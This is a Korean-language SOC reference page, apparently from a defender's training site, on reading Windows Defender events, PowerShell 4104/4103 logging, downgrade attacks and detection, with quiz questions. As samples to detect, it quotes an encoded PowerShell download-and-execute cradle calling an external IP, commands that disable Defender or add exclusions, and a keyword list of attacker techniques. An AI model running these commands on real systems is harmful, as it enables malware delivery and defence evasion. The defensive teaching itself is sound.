| 1121 / 1122 | 공격 표면 축소(ASR) 규칙이 동작을 **차단** / **감사만** 함 | 예: Office가 자식 프로세스를 만들기, LSASS에서 자격 증명 훔치기 — 가치 높은 신호 |
| 1123 / 1124 | 제어된 폴더 액세스가 차단 / 감사 | 보호 폴더를 바꾸려는 프로세스 — 랜섬웨어 행위 |
| 1125 / 1126 | 네트워크 보호가 연결을 감사 / 차단 | 알려진 나쁜 호스트로의 연결 |
| 2001 / 2003 | 보안 인텔리전스 / 엔진 업데이트 실패 | 컴퓨터가 뒤처지고 있음 |
| **5001** | **실시간 보호가 꺼짐** | 누군가 보호를 껐음(T1562.001) |
| **5007** | **설정이 바뀜**(이벤트에 옛 값과 새 값) | 새 **예외**(`...\Exclusions\Paths\C:\Users\Public`)를 지켜보세요 — 공격자는 도구를 떨구기 전에 자기 폴더를 예외로 만듭니다 |
| 5010 / 5012 | 악성코드 / 바이러스 검사가 꺼짐 | 5001과 같은 의미 |
| **5013** | **변조 방지가 변경을 막음** | Defender를 끄려는 시도가 막혔음 — 누군가 시도했다는 뜻 |

[보충] 공격자가 Defender에게 하는 첫 수는 보통 싸우는 게 아니라 "저쪽은 보지 마"라고 시키는 겁니다. `Set-MpPreference -ExclusionPath C:\Users\Public`이나 `-DisableRealtimeMonitoring $true`, 또는 레지스트리로 같은 일을 하죠. 그러면 **5007**(또는 **5001**), 명령줄에 `Set-MpPreference`가 든 `powershell.exe`의 **4688**, 같은 글자가 든 **4104**가 남습니다. 변조 방지가 켜져 있으면 대신 **5013**이 남고, 공격자는 스스로 자기 존재를 알린 셈이 됩니다. 변경 시간대가 아닌데 5007로 예외가 추가됐다면 악성코드 탐지처럼 조사하세요.

컴퓨터 한 대에서는 이벤트 뷰어를 열지 않고도 `Get-MpThreatDetection`으로 지난 탐지를 볼 수 있습니다.

```powershell
Get-MpThreatDetection | Select-Object InitialDetectionTime, ThreatID, ProcessName, DomainUser, ActionSuccess, Resources
```

```text
InitialDetectionTime : 20/11/2026 4:12:44 PM
ThreatID             : 2147700001
ProcessName          : C:\Windows\explorer.exe
DomainUser           : CORP\j.lee
ActionSuccess        : True
Resources            : {file:_C:\Users\j.lee\Downloads\tools\x64\mk.exe, containerfile:_C:\Users\j.lee\Downloads\tools.zip}
```

`Get-MpThreatDetection`은 탐지 기록을 꺼내고, `Select-Object`로 필요한 칸만 고릅니다. `Get-MpThreat`를 쓰면 `ThreatID`를 위협 이름으로 바꿀 수 있고, `ActionSuccess : True`는 성공한 1117에 해당합니다.

### 분석가처럼 탐지 읽기 { #defender-triage }

조치가 성공한 탐지라도 사건이 **끝난 게 아닙니다**. 이렇게 물어보세요.

- **어떻게 거기 왔나?** `Origin`, 담겨 있던 압축 파일, 브라우저 기록, 메일 로그. 도구를 내려받았다면 누군가 내려받기로 마음먹은 겁니다.
- **실행됐나?** `Execution Name` `Executing`이거나, 탐지 전에 그 파일의 4688/Sysmon 프로세스 이벤트가 있다면 무언가 할 시간이 있었습니다.
- **그 컴퓨터에 또 뭐가 있나?** 백신은 아는 파일만 잡습니다. 해킹 도구 탐지는 보통 모르는 다른 도구와 공격자 세션이 있다는 뜻입니다. 로그온(4624 유형 10/3), 새 서비스와 작업([서비스, 예약 작업, USB 이벤트](services-tasks-usb.md)), 계정(위)을 확인하세요.
- **다른 데도 있나?** 위협 이름과 파일 이름을 모든 호스트에서 찾아보세요.
- **누가 Defender를 끄려 했나?** 같은 호스트, 같은 시간대의 5001, 5007, 5013.

## PowerShell 로그 { #powershell }

### PowerShell에 왜 따로 로그가 필요한가 { #ps-why }

PowerShell은 Windows에 들어 있는 온전한 프로그래밍 언어입니다. 공격자는 인터넷에서 스크립트를 내려받아 파일을 한 번도 쓰지 않고 **메모리에서** 바로 돌릴 수 있고(`IEX (New-Object Net.WebClient).DownloadString(...)`), 명령을 Base64로 숨길 수 있고(`-EncodedCommand`), 실행 순간에 조각들을 이어 붙여 만들어서 단순한 문자열 검색을 피할 수도 있습니다(T1027.010, Command Obfuscation). 프로세스 생성 로그(4688, Sysmon 1)는 **`powershell.exe`를 시작한 명령줄**만 보여 줍니다. 공격자가 대화형 프롬프트에 명령을 치거나 명령줄이 `-enc SQBFAFgA...`뿐이라면, 프로세스 로그로는 실제로 무슨 일이 있었는지 거의 알 수 없습니다. 그 빈틈을 PowerShell 자체 로그가 채웁니다.

종류가 여러 개라 나란히 보면 이해가 쉽습니다.

| 로그 | 이벤트 / 위치 | 기록하는 것 | 켜는 법 |
| --- | --- | --- | --- |
| 스크립트 블록 로깅 | **4104**, `Microsoft-Windows-PowerShell/Operational` | 엔진이 컴파일하는 모든 스크립트 블록의 글자 — 그 단계에서 난독화가 풀린 상태 | GPO *Turn on PowerShell Script Block Logging* |
| 모듈 로깅 | **4103**, 같은 채널 | 매개변수를 포함한 명령 실행 하나하나(파이프라인 실행 정보) | GPO *Turn on Module Logging* + 모듈 이름(`*`) |
| 기록(transcription) | 지정한 폴더의 텍스트 파일 | 친 것 전부 **그리고 그 출력** — 화면을 글자로 녹화한 것 같음 | GPO *Turn on PowerShell Transcription* |
| 예전부터 있던 엔진 이벤트 | 400/403(엔진 시작/종료), 600(공급자), 800(파이프라인), `Windows PowerShell` 로그 | **호스트 버전**과 호스트 프로그램 명령줄이 든 엔진 시작 | 기본으로 켜짐 |

### 스크립트 블록 로깅 켜기 { #ps-config }

GPO는 *컴퓨터 구성 → 관리 템플릿 → Windows 구성 요소 → Windows PowerShell*에 있습니다. 이 레지스트리 값을 설정하니, 아무 컴퓨터에서나 확인할 수 있습니다.

```text
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
    EnableScriptBlockLogging    REG_DWORD    0x1
```

- `reg query <키>` — 정책 키 아래의 값을 보여 줍니다.
- `EnableScriptBlockLogging  REG_DWORD  0x1` — 스크립트 블록 로깅이 켜져 있습니다. 키가 없거나 `0x0`이면 수상한 블록 자동 기록만 됩니다(아래 참고).
- `EnableScriptBlockInvocationLogging`(이벤트 4105/4106, 블록마다 시작/끝)도 있습니다. 이건 **끄세요**. 양만 몇 배로 늘고 얻는 건 적습니다.

### 이벤트 4104: 스크립트 블록 만들기 { #4104 }

피싱 문서가 이 프로세스를 띄웁니다(4688에 보임).

```text
powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGEALgBwAHMAMQAnACkA
```

프로세스 로그에는 Base64만 보입니다. 같은 컴퓨터의 PowerShell Operational 로그에는 이게 보입니다.

```xml
<System>
  <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
  <EventID>4104</EventID>
  <Level>3</Level>
  <Task>2</Task>
  <Opcode>15</Opcode>
  <TimeCreated SystemTime="2026-11-20T05:30:02.3127755Z" />
  <Execution ProcessID="7412" ThreadID="5528" />
  <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
  <Computer>WS-031.corp.example</Computer>
  <Security UserID="S-1-5-21-1004336348-1177238915-682003330-1187" />
</System>
<EventData>
  <Data Name="MessageNumber">1</Data>
  <Data Name="MessageTotal">1</Data>
  <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')</Data>
  <Data Name="ScriptBlockId">9c2f7b1e-41d3-4a70-8f5e-2b7d6a0c3e91</Data>
  <Data Name="Path"></Data>
</EventData>
```

칸별로 보면:

- `Provider` `Microsoft-Windows-PowerShell`, `Channel` `Microsoft-Windows-PowerShell/Operational` — Windows PowerShell 5.1의 자체 로그입니다. Security 채널이 **아닙니다**. 따로 모으세요.
- `EventID` `4104` — "Creating Scriptblock text(스크립트 블록 글자 만들기)." `Task` `2` / `Opcode` `15`는 보기 좋은 화면에서 "Execute a Remote Command / On create calls"로 나옵니다. 이름이 이상하지만 그냥 스크립트 블록이 컴파일됐다는 뜻입니다.
- `Level` `3` — **경고(Warning)**. 글자에 PowerShell이 수상하다고 보는 단어(여기서는 `DownloadString`과 `IEX` 식 호출)가 들어 있어서 경고를 붙였습니다. 평범한 블록은 `Level` `5`(Verbose)입니다. 거칠지만 공짜인 첫 번째 거름망입니다.
- `Execution ProcessID="7412"` — `powershell.exe` 프로세스의 PID입니다. 4688 / Sysmon 1과 엮으면 부모(여기서는 `WINWORD.EXE`)와 전체 명령줄을 얻습니다.
- `Security UserID` — PowerShell을 돌린 사용자의 SID(`...-1187`, 여기서는 `CORP\j.lee`).
- `MessageNumber` / `MessageTotal` `1` / `1` — 이 블록은 이벤트 하나에 다 들어갔습니다. 긴 스크립트는 조각으로 나뉩니다(이벤트 하나에 대략 32 KB 글자). 예를 들어 `1 of 6` … `6 of 6`이 생기고, 다시 이어 붙여야 합니다.
- `ScriptBlockText` — **보물입니다.** 명령줄의 Base64가 사라졌습니다. 엔진이 컴파일하기 전에 풀었기 때문에, 로그에는 진짜 코드가 보입니다. `http://198.51.100.23/a.ps1`에서 글자를 내려받아 `IEX`(`Invoke-Expression`)로 실행하라는 뜻입니다. 내려받은 `a.ps1`도 결국 스크립트 블록으로 컴파일되므로, 디스크에 한 번도 닿지 않았는데도 **그다음 4104 이벤트들에 내려받은 스크립트의 코드가 나옵니다**.
- `ScriptBlockId` — 한 블록의 모든 조각에 똑같이 붙는 GUID입니다. 이 값으로 묶어서 나뉜 스크립트를 다시 합칩니다.
- `Path` — 직접 쳤거나 명령줄로 넘긴 코드라면 비어 있고, `.ps1` 파일을 실행했다면 그 경로가 들어 있습니다(예: `C:\Users\j.lee\AppData\Local\Temp\u.ps1`).

[보충] 왜 난독화가 살아남지 못할까요? 난독화된 코드는 결국 자기가 만든 문자열을 `Invoke-Expression`, `[ScriptBlock]::Create()` 같은 걸로 실행해야 하는데, 그때마다 엔진은 그 문자열을 컴파일해야 합니다. 그리고 4104가 기록하는 게 바로 그 컴파일입니다. 그래서 코드를 다섯 겹으로 감싼 공격자라면 4104가 다섯 개 생기고, 하나씩 갈수록 한 겹씩 벗겨져서 마지막 것은 그냥 읽히는 글자입니다. Base64는 직접 풀어서 확인할 수도 있습니다.

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBi...'))
```

- `[Convert]::FromBase64String('...')` — Base64 글자를 다시 바이트로 바꿉니다.
- `[Text.Encoding]::Unicode.GetString(...)` — 그 바이트를 **UTF-16LE**(.NET에서 "Unicode"라고 부르는 것)로 해석합니다. `-EncodedCommand`는 언제나 이 방식입니다. UTF-8로 풀면 글자 사이사이에 빈 문자가 끼어 보입니다. Base64 안에 `AAA` 무늬가 보이면 UTF-16LE라는 표시입니다.

결과: `IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')`. 이 작업은 분석 환경에서만 하고, 결과를 절대 실행하지 마세요.

호스트 한 대에서 나뉜 스크립트 다시 합치기:

```powershell
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104 } |
  Where-Object { $_.Properties[3].Value -eq '9c2f7b1e-41d3-4a70-8f5e-2b7d6a0c3e91' } |
  Sort-Object { $_.Properties[0].Value } |
  ForEach-Object { $_.Properties[2].Value } | Out-File C:\IR\block.txt
```

- `Get-WinEvent -FilterHashtable @{...Id=4104}` — PowerShell Operational 채널의 4104 이벤트 전부.
- `Where-Object { $_.Properties[3].Value -eq '...' }` — 네 번째 속성(`ScriptBlockId`)이 우리 GUID인 것만 남깁니다. 속성은 `EventData` 순서대로 0부터 번호가 붙습니다. 0 `MessageNumber`, 1 `MessageTotal`, 2 `ScriptBlockText`, 3 `ScriptBlockId`, 4 `Path`.
- `Sort-Object { $_.Properties[0].Value }` — 조각을 `MessageNumber` 순서로 놓습니다(이벤트는 최신 것부터 나오기 때문).
- `ForEach-Object { $_.Properties[2].Value }` — 조각마다 글자만 꺼냅니다.
- `Out-File C:\IR\block.txt` — 합친 스크립트를 파일로 써서 읽습니다. 콘솔에 붙여 넣지 **마세요**.

### 왜 "시끄러운가" — 그리고 어떻게 하나 { #ps-noise }

스크립트 블록 로깅을 켜면 돌아가는 모든 스크립트가 4104를 만듭니다. 로그온 스크립트, 관리 에이전트, Windows 자체 유지 관리 작업, PowerShell 프로필, 기본 모듈이 처음 불릴 때 그 안의 코드까지요. 관리 도구 하나가 시간당 수천 개를 만들기도 합니다. 실무적인 답은 이렇습니다.

- **전부 모으고, 내용으로 경보를 겁니다.** 저장 공간은 중요한 블록 하나를 놓치는 것보다 쌉니다. 이미 아는 정상 에이전트는 로깅을 끄는 게 아니라 SIEM에서 `Path`와 늘 같은 글자로 걸러 냅니다.
- **무늬로 찾아봅니다**: `Level` 3(Warning) 이벤트; `FromBase64String`, `-bxor`, `IEX`/`Invoke-Expression`, `DownloadString`/`DownloadFile`/`Invoke-WebRequest`, `Reflection.Assembly]::Load`, `VirtualAlloc`, `AmsiUtils`, `Set-MpPreference`, `Add-MpPreference -ExclusionPath`, `New-Object Net.Sockets.TCPClient`, 무작위처럼 보이는 긴 문자열, LSASS를 건드리는 스크립트.
- **로그 크기를 키웁니다.** PowerShell Operational 로그 기본 크기는 작아서(약 15 MB) 스크립트 블록 로깅을 켜면 금방 덮어써집니다. 크기를 늘리거나(예: 1 GB 이상) 계속 전달하세요.
- **보호합니다.** 스크립트 블록에는 비밀(스크립트 안의 비밀번호)이 들어 있을 수 있습니다. SIEM에서 누가 읽을 수 있는지 제한하고, 인증서로 글자를 암호화해 수집기만 읽게 하는 *Protected Event Logging(보호된 이벤트 로깅)* 도 고려하세요.

### 이벤트 4103과 기록(transcription) { #4103 }

모듈 로깅(4103)은 명령을 **실행되는 순간** 하나하나, 실행 때 정해진 매개변수 값과 함께 기록합니다.

```text
EventID 4103  Microsoft-Windows-PowerShell/Operational  WS-031.corp.example
ContextInfo:
        Severity = Informational
        Host Name = ConsoleHost
        Host Application = powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4A...
        Command Name = New-Object
        Command Type = Cmdlet
        User = CORP\j.lee
        Shell ID = Microsoft.PowerShell
Payload:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Net.WebClient"
```

- `Host Application` — PowerShell을 품고 있는 프로세스의 명령줄. Base64까지 그대로입니다.
- `Command Name` / `Command Type` — 어떤 cmdlet이나 함수가 돌았는지.
- `User` — 누구의 세션인지.
- `Payload` — `CommandInvocation` 줄은 명령 이름을, `ParameterBinding` 줄은 매개변수마다 **최종 값**을 보여 줍니다. 조각을 이어 붙여 만든 URL, 파일 이름, IP가 여기서 드러날 수 있습니다.

**기록(transcription)** 은 세션마다 텍스트 파일 하나를 씁니다(예: `C:\PSTranscripts\20261120\PowerShell_transcript.WS-031.Xk3a9Lm2.20261120163002.txt`). 머리 부분(시작 시각, 사용자, 컴퓨터, 호스트 프로그램) 뒤에 모든 명령 **그리고 그 출력**이 이어집니다. 셋 중 공격자가 화면에서 본 것을 보여 주는 건 이것뿐입니다. 예를 들어 정보 탐색 명령이 찍어 준 도메인 관리자 목록 같은 것이요. 기록은 사용자가 고칠 수 없는 폴더, 가능하면 파일을 추가만 할 수 있는 원격 공유에 쓰게 하세요.

### 다운그레이드 공격과 PowerShell 7 { #ps-downgrade }

[보충] 위의 로깅은 모두 PowerShell 5에서 생겼습니다. **PowerShell 2.0**에는 하나도 없었고, 공격자들은 오랫동안 `powershell.exe -Version 2 -Command ...`로 그냥 피해 갔습니다(ATT&CK **T1562.010**, Downgrade Attack). 알아보는 표시는 `Windows PowerShell` 로그의 예전부터 있던 **이벤트 400**에 `HostVersion=2.0`, `EngineVersion=2.0`이 찍히는 것입니다. Microsoft는 이제 PowerShell 2.0 엔진을 Windows 11(24H2)과 Windows Server 2025에서 **제거했습니다**(2025년 8–9월 업데이트부터). 그래서 이 버전들에서는 이 수법이 더 이상 통하지 않습니다. 오래된 시스템에서는 선택적 기능 *Windows PowerShell 2.0 Engine*을 직접 제거하고, 버전 2.0이 찍힌 이벤트 400에 계속 경보를 걸어 두세요.

**PowerShell 7**(따로 설치하는 크로스 플랫폼 버전, `pwsh.exe`)도 4103/4104를 똑같이 만들지만, **자기만의** 채널인 `PowerShellCore/Operational`에 쓰고, **자기만의** 정책 설정을 읽습니다. PowerShell 7이 깔린 컴퓨터는 그 채널을 모으고 PowerShell 7 정책을 따로 설정해야 합니다. 안 그러면 공격자가 `powershell.exe` 대신 `pwsh.exe`를 쓰기만 하면 됩니다. PowerShell 엔진을 품는 다른 프로그램들(`System.Management.Automation.dll`을 불러오는 직접 만든 `.NET` 프로그램, 이른바 "powershell.exe 없는 PowerShell")도 스크립트 블록 로깅이 켜져 있으면 4104를 남깁니다. 로깅이 `.exe`가 아니라 엔진 안에 있기 때문입니다.

## SOC에서 써먹기 { #soc-use }

- **채널을 모읍니다.** Security(4720–4767, 4781, 4727–4737, 4754–4758), `Microsoft-Windows-Windows Defender/Operational`, `Microsoft-Windows-PowerShell/Operational`, `Windows PowerShell`(400/800), 그리고 PowerShell 7이 있는 곳은 `PowerShellCore/Operational`. **모든** 도메인 컨트롤러에서.
- **확신도 높은 경보:** `Administrators`(S-1-5-32-544), `Domain Admins`, `Enterprise Admins`, `Schema Admins`, `Backup Operators`, `Account Operators`, `DnsAdmins`에 구성원 추가 — SID 기준으로, 4732/4728/4756 모두; 같은 `SubjectLogonId`로 4720 뒤에 관리자 그룹 추가; 비어 있지 않은 `SidHistory`; Defender 5001/5013, 예외를 추가하는 5007, 조치 실패 1118/1119, 모든 `HackTool`, `Exploit`, `Backdoor`, `Ransom` 탐지; `Level` 3이거나 위 무늬에 맞는 4104; `HostVersion=2.0`인 400.
- **나머지는 쌓아서 봅니다:** 호스트별 새 로컬 계정(대부분 0개여야 정상), 주체(Subject)별 그룹 변경, 유형·호스트별 Defender 탐지, 글자 해시로 묶은 4104 블록 — 한 호스트에서만 보인 드문 블록은 읽어 볼 가치가 있습니다.
- **이벤트끼리 엮습니다:** `SubjectLogonId` → 4624; 4104 `ProcessID` → 4688/Sysmon 1 부모; Defender `Detection ID` 1116 → 1117; Defender 탐지 시각 → 몇 초 전의 프로세스, 로그온, 네트워크 이벤트.
- **시각에 주의합니다:** XML `SystemTime`은 UTC, 글자로 풀린 메시지와 `Get-MpThreatDetection`은 현지 시각입니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효한 것"
    4720, 4722–4726, 4738, 4732/4728/4756과 짝이 되는 제거 이벤트는 Windows 11과 Windows Server 2025에서도 칸까지 그대로이고, 계정 생성과 관리자 그룹 추가는 사람이 직접 들어오는 침해와 랜섬웨어 사건에서 여전히 늘 나오는 단계입니다. Defender Operational 채널과 1116/1117, 1006/1007, 5001, 5007, 5013도 지금 그대로입니다. 스크립트 블록 로깅(4104)과 모듈 로깅(4103)도 설명대로 동작하며, 조사에서 가장 가치 있는 Windows 로그에 여전히 속합니다. 4104는 지금도 출력을 남기지 않으니 기록(transcription)도 여전히 중요합니다.

!!! info "[변경됨] 바뀐 점"
    - **이름.** "Windows Defender ATP"는 **Microsoft Defender for Endpoint**가 됐고, **Microsoft Defender XDR**(예전 Microsoft 365 Defender)의 일부로서 Microsoft Sentinel과 함께 통합 Microsoft Defender 포털에서 관리됩니다. 백신 자체는 **Microsoft Defender Antivirus**이지만, 이벤트 채널과 폴더 이름에는 아직 "Windows Defender"가 남아 있습니다.
    - **변조 방지(tamper protection)** 는 가정용 사용자와 새 Defender for Endpoint 테넌트에서 기본으로 켜져 있습니다. 그래서 Defender를 끄려는 시도가 성공한 5001보다 **5013**으로 보이는 일이 늘었습니다. 공격자들은 예외 악용, 취약한 드라이버로 보안 도구 죽이기, 다른 회사 EDR 아래에서 Defender가 수동 모드인 컴퓨터 노리기로 옮겨 갔습니다.
    - **PowerShell 2.0이 사라졌습니다.** Windows 11 24H2와 Windows Server 2025에서 제거됐고(2025년 8–9월 업데이트부터), 그 버전들에서는 고전적인 다운그레이드 길이 막혔습니다. 오래된 시스템은 여전히 직접 기능을 제거해야 합니다.
    - **ATT&CK 매핑.** 계정 생성 T1136.001/.002, 특권 그룹에 추가 **T1098.007**(2024년에 추가된 하위 기법), PowerShell T1059.001, 명령 난독화 T1027.010, Defender 끄기 T1562.001, PowerShell 다운그레이드 T1562.010.
    - **아이덴티티 공격도 클라우드로 옮겨 갔습니다.** 하이브리드 환경에서 Microsoft Entra ID(예전 Azure AD)에 계정을 만들거나 역할을 붙이는 건 4720/4728의 클라우드 버전입니다. Windows Security 로그가 아니라 Entra 감사 로그에 남으니 따로 모아야 합니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 것"
    - **4728만 지켜보지 마세요.** DC의 기본 Administrators는 4732, Enterprise Admins는 4756입니다.
    - **`MemberName`이나 영어 그룹 이름으로 맞추지 마세요.** `MemberSid`와 그룹의 `TargetSid`를 쓰세요.
    - **DC 한 대에서만 모으지 마세요.** 변경은 그걸 처리한 DC에만 남습니다.
    - **조치가 성공했다고 Defender 경보를 닫지 마세요.** 어떻게 들어왔는지, 실행됐는지, 또 뭐가 있는지 확인하세요. 특히 `HackTool` 탐지는요.
    - **5007을 무시하지 마세요.** 새 예외는 진짜 도구가 도착하기 바로 전 순간인 경우가 많습니다.
    - **4104가 PowerShell 7을 다루거나 출력을 보여 준다고 생각하지 마세요.** `PowerShellCore/Operational`을 모으고, 출력은 기록(transcription)으로 남기세요.
    - **시끄럽다고 스크립트 블록 로깅을 끄지 마세요.** 로그 크기를 늘리고, 전달하고, SIEM에서 거르세요.
    - **다시 합친 공격 코드를 콘솔에 붙여 넣지 마세요.** 글자로만 읽으세요.

## 확인 문제 { #quiz }

### 문제 1

도메인 컨트롤러 `DC-01`에서 4732를 찾았습니다. `TargetUserName` `Administrators`, `TargetDomainName` `Builtin`, `TargetSid` `S-1-5-32-544`, `MemberName` `CN=Backup Svc,OU=Service Accounts,DC=corp,DC=example`, Subject `CORP\it.ops3`. 동료가 "4732는 컴퓨터 한 대의 로컬 그룹이니까 DC-01에만 영향이 있어. 우선순위 낮음."이라고 합니다. 맞나요? 어떻게 하겠습니까?

??? success "정답과 해설"
    아닙니다. 도메인 컨트롤러에는 보통 말하는 "로컬" 그룹이 없습니다. DC의 `BUILTIN\Administrators`는 Active Directory에 저장되어 **모든 도메인 컨트롤러**가 함께 쓰는 **도메인 로컬** 그룹입니다. 여기 구성원은 모든 DC의 관리자이고, 사실상 도메인 전체를 손에 쥔 것입니다. Domain Admins만큼 강합니다. 그래서 이벤트가 4728(글로벌, 예: Domain Admins)이 아니라 4732(도메인 로컬 범위)인 겁니다.

    이번에는 구성원이 AD 개체(Service Accounts OU의 `Backup Svc`)라서 `MemberName`이 채워져 있고, `MemberSid`가 정확히 누구인지 알려 줍니다. **다음 할 일:** 높은 우선순위로 다루세요(T1098.007). `it.ops3`의 변경 요청서가 있는지 확인하고, `SubjectLogonId`의 4624(로그온 유형과 출발지)를 찾고, `Backup Svc` 계정이 최근에 만들어졌는지(어느 DC에서든 4720) 바뀌었는지(4738, 비밀번호 재설정 4724) 보고, 변경 이후 그 계정의 로그온을 찾고, 승인되지 않았다면 증거를 보존한 뒤 그룹에서 빼세요.

### 문제 2

`WS-044`에서 10분 안에 이런 것들이 보입니다. Defender **5007**의 새 값이 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData\Sync = 0x0`; 그다음 `Add-MpPreference -ExclusionPath 'C:\ProgramData\Sync'`가 든 **4104**(Level 3); 그다음 `Threat Name` `Behavior:Win32/...`, `Path` `process:_pid:6120`인 **1116**; 그리고 `C:\ProgramData\Sync` 안의 파일 탐지는 하나도 없습니다. 무슨 일이 있었고, 왜 파일 탐지가 없었는지 설명하세요.

??? success "정답과 해설"
    누군가 PowerShell(`Add-MpPreference -ExclusionPath`)로 Defender에게 `C:\ProgramData\Sync`를 **검사하지 말라고** 시켰습니다. T1562.001, Impair Defenses입니다. 4104는 명령 글자를 남겼고(Defender 설정을 건드려서 Warning 수준), 5007은 그 결과로 바뀐 설정(`Exclusions\Paths` 아래의 새 레지스트리 값)을 남겼습니다. 이걸 하려면 관리자 권한이 필요하니, 행위자는 이미 관리자 권한이 있었습니다.

    예외 경로의 파일은 **검사하지 않으니**, 거기 떨군 도구는 1116 파일 탐지를 만들지 않습니다. 공격자가 바란 그대로입니다. 그런데도 **행위** 탐지(`Behavior:`, 실행 중인 프로세스 `pid:6120`)는 떴습니다. 행위 감시는 디스크의 파일만이 아니라 프로세스가 무엇을 하는지 보기 때문입니다. **다음 할 일:** 4688/Sysmon 1에서 PID 6120을 찾고(이미지 경로 — 아마 예외 폴더 안 — 부모, 명령줄), 4104 뒤의 PowerShell 프로세스(`Execution ProcessID`)와 그 부모를 찾고, `C:\ProgramData\Sync`의 파일 목록과 해시를 뽑고, 예외를 지우고, 다른 호스트에도 같은 5007이 있는지 보세요. 변조 방지가 왜 못 막았는지도 짚어 두세요. 변조 방지는 예외가 중앙에서(예: Intune) 변조 방지 대상이 되게 설정되어 관리될 때만 예외를 지켜 줍니다.

### 문제 3

`WS-031`의 4688에 부모가 `WINWORD.EXE`인 `powershell.exe -nop -w hidden -enc JABzAD0A...`가 보입니다. 그 시간대 그 호스트의 PowerShell Operational 로그에는 관리 에이전트가 만든 `Level` 5 이벤트 몇 개뿐이고, 인코딩된 명령에 해당하는 4104는 없습니다. 그리고 `Windows PowerShell` 로그에 `HostVersion=2.0`인 이벤트 400이 있습니다. 지금 보고 있는 게 무엇인지, 그리고 이 호스트의 설정에 대해 무엇을 알려 주는지 설명하세요.

??? success "정답과 해설"
    Word가 인코딩된 명령으로 숨긴 PowerShell을 띄우는 건 전형적인 악성 문서 사슬입니다(T1566.001 → T1059.001). 보통이라면 스크립트 블록 로깅이 풀린 코드를 4104에 남겼을 겁니다. 4104가 없고 **`HostVersion=2.0`인 이벤트 400**이 있다는 건, 페이로드가 PowerShell **버전 2**를 띄웠다는 뜻입니다(예: `-Version 2`나 v2 엔진 직접 호출). 버전 2에는 스크립트 블록 로깅도 모듈 로깅도 **없습니다**. **다운그레이드 공격**(T1562.010)입니다. 인코딩된 명령은 로깅할 수 있는 엔진에 한 번도 닿지 않았습니다.

    이건 그 호스트에 **Windows PowerShell 2.0 엔진**이 아직 깔려 있다는 뜻이고(즉 최신 Windows 11 24H2 / Server 2025가 아니거나, 기능을 다시 추가함), 버전 2.0이 찍힌 이벤트 400에 대한 경보도 없었다는 뜻입니다. **다음 할 일:** 4688 명령줄의 Base64를 분석 환경에서 직접(UTF-16LE로) 풀어 명령을 보고, 다운로드 흔적을 네트워크 로그에서 찾고, 그 PowerShell의 자식 프로세스를 따라가세요. 고치는 쪽으로는 전체 컴퓨터에서 PowerShell 2.0 기능을 제거하고 이벤트 400 경보를 추가하세요.

## 관련 레퍼런스 { #related }

- [꼭 알아야 할 이벤트](index.md) — 이 섹션 개요
- [로그인 이벤트](logins.md) — `SubjectLogonId` 뒤의 로그온, 계정 잠김과 비밀번호 스프레이
- [프로세스 생성 이벤트](process-creation.md) — `net.exe`, `powershell.exe`와 그 부모
- [서비스, 예약 작업, USB 이벤트](services-tasks-usb.md) — 공격자가 계정 옆에 함께 심는 다른 지속성
- [Windows 이벤트 속 들여다보기](../windows-logging/event-structure-channels.md) — `%%` 메시지 코드, Defender와 PowerShell이 자기 채널을 따로 쓰는 이유
- [실행, 지속성, 정보 탐색](../endpoint-attacks/execution-persistence-discovery.md) — 공격자 쪽에서 본 PowerShell 실행과 계정 지속성
- [자격 증명 덤프와 Mimikatz](../endpoint-attacks/credential-dumping-mimikatz.md) — `HackTool` 탐지가 뜻할 수 있는 것
- [Credential Guard, Application Guard, 호스트 방화벽, 백신](../endpoint-defense/vbs-firewall-antivirus.md) — 방어 계층으로서의 백신
- [PAW, 권한과 특권, EDR, DLP, UEBA, 감사 로깅](../endpoint-defense/paw-edr-dlp-ueba.md) — 이 이벤트들 너머의 EDR 텔레메트리
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md)
- [Windows 이벤트 로그(EVTX)](../../../windows/event-logs.md)
